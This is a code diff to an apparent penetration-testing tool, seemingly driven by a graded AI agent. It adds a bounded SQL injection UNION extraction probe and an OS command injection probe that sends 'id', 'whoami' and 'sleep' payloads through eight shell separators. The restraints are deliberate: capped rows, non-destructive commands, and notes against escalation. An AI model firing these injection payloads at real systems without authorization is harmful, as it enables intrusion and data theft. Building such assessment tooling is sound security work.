@@ -127,7 +127,9 @@ def probe_reflection(ctx: Context, url: str, param: str,
 
 
 def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
-               data: str | None = None, union_cols: int = 0) -> dict:
+               data: str | None = None, union_cols: int = 0,
+               extract_table: str = "", extract_columns: str = "",
+               extract_rows: int = 5) -> dict:
     tool = "probe_sqli"
     base = _send(ctx, url, param, "1", method, data, tool, "baseline")
     quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
@@ -227,6 +229,46 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
                         else "quoted", "trace": trace,
                         "note": "column count for UNION SELECT; verify "
                                 "with UNION SELECT NULL,... before citing"}
+    # Opt-in bounded read. The sqli class is proven by a row from a named
+    # table (`argus proof sqli`), and composing the UNION by hand is where a
+    # weaker model spends its budget on syntax instead of on the assessment.
+    # LIMIT is applied here rather than trusted to the caller: five rows is a
+    # proof and a full dump is an incident.
+    if extract_table:
+        table = str(extract_table).strip()
+        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.]{0,63}", table):
+            out["extract"] = {"error": f"{table!r} is not a table identifier"}
+            return out
+        columns = [c.strip() for c in str(extract_columns or "").split(",")
+                   if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.*]{0,63}", c.strip())]
+        if not columns:
+            out["extract"] = {"error": "extract_columns needs at least one "
+                                       "column identifier"}
+            return out
+        width = (out.get("union") or {}).get("columns") or len(columns)
+        width = max(int(width or len(columns)), len(columns))
+        selected = columns + ["NULL"] * (width - len(columns))
+        rows = _ival(extract_rows, 5, 1, 20)
+        quoted_ctx = not ((out.get("union") or {}).get("context") == "numeric")
+        prefix = "1' " if quoted_ctx else "1 "
+        payload = (f"{prefix}UNION SELECT {', '.join(selected)} FROM {table} "
+                   f"LIMIT {rows}-- -")
+        r = _send(ctx, url, param, payload, method, data, tool,
+                  f"union-extract/{table}")
+        body = r.get("body") or ""
+        error = SQL_ERRORS.search(body)
+        out["extract"] = {
+            "table": table, "columns": columns, "limit": rows,
+            "request_id": r["request_id"], "status": r["status"],
+            "width_used": width,
+            "error_marker": error.group(0) if error else None,
+            "changed_from_baseline": _similarity(body, bodies["base"]) < 0.95,
+            "note": ("quote one row from this response in record_finding, with "
+                     "the request_id that named the engine - the class needs "
+                     "both" if not error else
+                     "the engine rejected the UNION: re-read the column count "
+                     "and the context, the payload is in the transcript"),
+        }
     return out
 
 
@@ -264,6 +306,127 @@ def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
         "results": results,
         "note": "repeat a slow family once to rule out noise before recording a finding",
     }
+
+
+# The only command this system sends to prove execution: it reads identity,
+# echoes a nonce, changes nothing, opens no socket, leaves no artifact. A
+# destructive payload would void the evidence anyway - argus/proof.py vetoes it.
+_CMDI_SEPARATORS = [
+    ("semicolon", "{base}; {cmd}"),
+    ("pipe", "{base}| {cmd}"),
+    ("and", "{base}&& {cmd}"),
+    ("background", "{base}& {cmd}"),
+    ("newline", "{base}%0a{cmd}"),
+    ("subshell", "{base}$({cmd})"),
+    ("backtick", "{base}`{cmd}`"),
+    ("quoted-break", '{base}"; {cmd} #'),
+]
+
+_CMDI_IDENT_RE = re.compile(r"uid=\d+\([^)\n]{1,64}\)|uid=\d+\s+gid=\d+")
+_CMDI_WINIDENT_RE = re.compile(r"(?i)\b(nt authority\\[a-z ]+|[a-z0-9_.-]+\\[a-z0-9_.-]+)")
+
+
+def probe_cmdi(ctx: Context, url: str, param: str, method: str = "GET",
+               data: str | None = None, delay_s: int = 4) -> dict:
+    """OS command injection, probed for the artifact the proof matrix needs.
+
+    `probe_time` already finds the blind case. What it cannot produce is the
+    evidence an rce finding requires: an identity line the target computed,
+    carrying a nonce that ties the output to this probe. So this probe sends
+    `id; echo <nonce>` (and the Windows pair) across the separator families and
+    reads the OUTPUT, not the timing.
+
+    The nonce matters for a reason the grading makes explicit: a parameter that
+    merely reflects `id` back as text produces the string `uid=` in the
+    response without executing anything. `argus/proof.py` refuses that case by
+    checking the identity line is absent from the request that produced it -
+    this probe is what gives it a request to check.
+    """
+    tool = "probe_cmdi"
+    nonce = _marker("argus")
+    base = _send(ctx, url, param, "127.0.0.1", method, data, tool, "baseline")
+    base_body = base.get("body", "") or ""
+    baseline_ms = base["elapsed_ms"]
+
+    # unix and windows, because the identity line differs and the operator
+    # does not always know which one is answering
+    commands = [("unix", f"id; echo {nonce}"),
+                ("windows", f"whoami & echo {nonce}")]
+    results, proven, echoed_only = [], None, None
+    for family, sep in _CMDI_SEPARATORS:
+        for os_family, cmd in commands:
+            payload = sep.format(base="127.0.0.1", cmd=cmd)
+            r = _send(ctx, url, param, payload, method, data, tool,
+                      f"{family}/{os_family}")
+            body = r.get("body", "") or ""
+            ident = _CMDI_IDENT_RE.search(body) or _CMDI_WINIDENT_RE.search(body)
+            # the nonce must come back, and the identity line must NOT be in
+            # what we sent - otherwise this is the page echoing our payload
+            reflected = bool(ident) and ident.group(0) in payload
+            hit = bool(ident) and not reflected and nonce in body
+            results.append({
+                "separator": family, "os": os_family,
+                "request_id": r["request_id"], "status": r["status"],
+                "identity": ident.group(0) if ident and not reflected else None,
+                "marker_returned": nonce in body,
+                "reflected_only": reflected,
+            })
+            if hit and proven is None:
+                proven = results[-1]
+            elif nonce in body and not ident and echoed_only is None:
+                echoed_only = results[-1]
+            if proven is not None:
+                break
+        if proven is not None:
+            break
+
+    out = {
+        "nonce": nonce,
+        "baseline_ms": baseline_ms,
+        "results": results,
+        "request_ids": {f"{r['separator']}/{r['os']}": r["request_id"]
+                        for r in results},
+    }
+    if proven is not None:
+        out["verdict"] = (f"command output returned: {proven['identity']} with the "
+                          f"probe nonce, via {proven['separator']} "
+                          f"({proven['os']})")
+        out["proof_request_id"] = proven["request_id"]
+        out["note"] = ("record_finding(category='rce') citing this request_id and "
+                       "quoting the identity line - that is the full requirement "
+                       "for the class. Do not escalate: no shell, no write, no "
+                       "download")
+        return out
+    if echoed_only is not None:
+        out["verdict"] = ("marker returned without an identity line - the "
+                          "parameter is reflected, not executed")
+        out["note"] = ("this is a reflection. Check xss instead, and do not "
+                       "record rce: the grading rejects an identity line that "
+                       "appears in its own request")
+        return out
+    # no output channel: fall back to the timing oracle, which is a candidate
+    delay_s = _ival(delay_s, 4, 2, 10)
+    threshold = baseline_ms + delay_s * 700
+    timed = []
+    for family, sep in _CMDI_SEPARATORS[:4]:
+        r = _send(ctx, url, param,
+                  sep.format(base="127.0.0.1", cmd=f"sleep {delay_s}"),
+                  method, data, tool, f"blind/{family}")
+        if r["elapsed_ms"] >= threshold:
+            timed.append({"separator": family, "elapsed_ms": r["elapsed_ms"],
+                          "request_id": r["request_id"]})
+    out["blind"] = {"threshold_ms": round(threshold, 1), "slow": timed}
+    out["verdict"] = ("blind candidate: delay on " +
+                      ", ".join(t["separator"] for t in timed)) if timed else \
+        "no signal"
+    out["note"] = ("a timing delta is a candidate, not an rce finding: the class "
+                   "requires command OUTPUT. Try an out-of-band channel or a "
+                   "write-then-read on a path the app serves, and if neither is "
+                   "available say so in the report" if timed else
+                   "no output and no delay on any separator family")
+    if base_body and not timed:
+        out["note"] += " - the parameter may never reach a shell"
+    return out
 
 
 _SSTI_TEMPLATES = [
